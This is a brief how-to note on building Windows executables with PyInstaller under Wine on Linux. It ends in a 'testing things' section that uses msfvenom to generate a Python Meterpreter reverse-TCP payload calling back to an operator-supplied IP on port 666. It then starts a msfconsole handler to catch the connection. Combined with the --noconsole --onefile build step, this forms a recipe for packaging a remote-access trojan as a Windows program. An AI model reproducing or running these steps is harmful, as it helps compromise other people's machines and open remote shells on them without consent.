WARNING: this build only works for wine 'INTEL 32bytes' system...


I've successfully used PyInstaller running under Wine to produce an executable which runs on Windows.
Set up your Wine environment on Linux, putting a copy of PyInstaller (folder ) in an appropriate location.
e.g:  drive_c\pyinstaller-2.0




Also install Python for Windows in your Wine environment.
You have to use the msiexec option run the Python installer.
-------------------------------
wine msiexec /i python-2.6.6.msi
--------------------------------


You might also need to install other dependencies such as pywin32.
http://sourceforge.net/projects/pywin32/
just install: pywin32-220.win32-py2.6.exe using WINE loader



Then, simply run PyInstaller on you spec file:
-------------------------------------------------------------------------
wine c:/Python26/Python.exe c:/pyinstaller-2.0/pyinstaller.py <spec_file>
wine c:/Python26/Python.exe c:/pyinstaller-2.0/pyinstaller.py --noconsole --onefile <spec_file>
-------------------------------------------------------------------------
This takes care of creating an executable which will run under windows.
Packaging this exe as part of an installer is an additional task for which
you could use NSIS as suggested in other answers. I'm not sure if NSIS
will successfully run under Wine on Linux.



testing things:
---------------
build python payload:
sudo msfvenom -p python/meterpreter/reverse_tcp LHOST=<YOUR IP> LPORT=666 -f raw > spec_file.py
chmod +x spec_file.py

start a listenner:
sudo msfconsole -x 'use exploit/multi/handler; set LHOST <YOUR IP>; set LPORT 666; set PAYLOAD python/meterpreter/reverse_tcp; exploit'


